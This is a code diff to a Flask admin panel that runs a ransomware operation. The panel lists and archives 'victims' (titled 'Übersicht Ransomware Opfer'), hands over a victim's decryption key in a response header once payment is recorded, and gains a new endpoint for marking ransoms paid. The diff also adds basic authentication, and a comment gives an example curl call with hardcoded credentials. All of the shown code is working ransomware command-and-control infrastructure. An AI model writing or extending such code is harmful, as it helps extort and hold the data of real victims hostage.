@@ -1,25 +1,30 @@
 from flask import render_template, url_for, flash, redirect, request, make_response
-from app import app, db
+from app import app, db, auth, verify_password
+from werkzeug.security import check_password_hash
 from app.models import Victim, load_victim
 import random, os
 import base64
 import nacl
 
+
 # Show an overview of all victims currently registered in the database
 @app.route("/", methods=["GET"])
 @app.route("/overview", methods=["GET"])
+@auth.login_required
 def displayIndex():
     victims = Victim.query.filter_by(archived=0).all()
     return render_template(
         "overview.html",
         title="Übersicht Ransomware Opfer",
         victims=victims,
+        user=auth.current_user(),
         count=len(victims),
     )
 
 
 # Show archived victims in an overview table
 @app.route("/archive")
+@auth.login_required
 def displayArchive():
     victims = Victim.query.filter_by(archived=1).order_by(Victim.victim_id.desc()).all()
     return render_template("archive.html", title="Archiv", victims=victims)
@@ -60,6 +65,19 @@ def checkStatus(victim_id):
     response.headers["Payment-Received"] = str(victim.payment_received)
     if victim.payment_received:
         response.headers["Victim-Key"] = victim.victim_key
+    return response
+
+
+# When called, the specific victim has payed it's ransom and can be set as so in the DB
+# ex: curl -i -X POST http://rnsm-admin:rnsm@localhost:5000/paymentReceived/261153847923
+@app.route("/paymentReceived/<int:victim_id>", methods=["POST"])
+@auth.login_required
+def receivePayment(victim_id):
+    victim = Victim.query.get(victim_id)
+    victim.payment_received = True
+    victim.archived = True
+    db.session.commit()
+    response = make_response(render_template("404.html"), 404)
     return response
 
 
